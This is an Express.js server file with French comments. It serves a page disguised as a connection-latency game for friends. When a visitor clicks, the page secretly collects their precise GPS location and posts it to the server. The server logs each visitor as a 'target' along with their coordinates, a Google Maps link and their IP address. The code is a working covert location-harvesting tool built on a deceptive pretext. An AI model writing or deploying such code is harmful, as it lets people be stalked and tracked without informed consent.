const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour analyser le JSON envoyé par le navigateur
app.use(express.json());

// 1. La page Web du mini-jeu envoyée à vos amis
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <title>Test de Réflexes & Connexion</title>
            <style>
                body { font-family: Arial, sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 50px; }
                .card { background: #1e293b; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 400px; }
                button { background: #3b82f6; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; font-weight: bold; }
                button:hover { background: #2563eb; }
                #statut { margin-top: 20px; font-size: 14px; color: #94a3b8; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>⚡ Défi de Connexion</h2>
                <p>Cliquez sur le bouton ci-dessous pour lancer le test de latence et comparer votre score avec le groupe !</p>
                <button onclick="lancerTest()">Lancer le test</button>
                <p id="statut">En attente de l'utilisateur...</p>
            </div>

            <script>
                function lancerTest() {
                    document.getElementById("statut").innerText = "Analyse du réseau en cours...";
                    
                    if (navigator.geolocation) {
                        // Demande la position GPS précise
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            
                            // Envoi discret des coordonnées au serveur
                            fetch('/save-location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ lat: lat, lon: lon })
                            });

                            setTimeout(() => {
                                document.getElementById("statut").innerText = "Test réussi ! Score enregistré.";
                            }, 1500);

                        }, function(error) {
                            document.getElementById("statut").innerText = "Erreur de synchronisation réseau.";
                        }, { enableHighAccuracy: true });
                    } else {
                        document.getElementById("statut").innerText = "Navigateur non compatible.";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// 2. Route qui reçoit les coordonnées GPS et les affiche dans vos logs Render
app.post('/save-location', (req, res) => {
    const { lat, lon } = req.body;
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    console.log("========================================");
    console.log("🎯 CIBLE DÉTECTÉE !");
    console.log(`📍 Latitude exacte  : ${lat}`);
    console.log(`📍 Longitude exacte : ${lon}`);
    console.log(`🔗 Lien Google Maps : https://www.google.com/maps?q=${lat},${lon}`);
    console.log(`🌐 Adresse IP       : ${clientIp}`);
    console.log("========================================");

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});